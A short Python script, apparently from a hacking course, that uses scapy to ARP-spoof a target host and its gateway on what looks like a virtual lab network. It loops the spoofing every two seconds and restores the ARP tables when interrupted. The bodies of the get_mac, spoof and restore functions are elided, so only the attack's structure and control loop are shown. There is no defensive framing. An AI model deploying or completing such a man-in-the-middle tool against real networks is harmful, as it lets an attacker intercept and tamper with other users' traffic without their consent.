import scapy.all as scapy
import time
import sys

def get_mac(ip):...

def spoof(target_ip, spoof_ip):...


def restore(destination_ip, source_ip):...

target_ip = "10.0.2.7"
gateway_ip = "10.0.2.1"

try:
    packets_sent_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        packets_sent_count = packets_sent_count +2
        print("\r[+]Sent " + str(packets_sent_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ... Resetting ARP tables..... Please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)


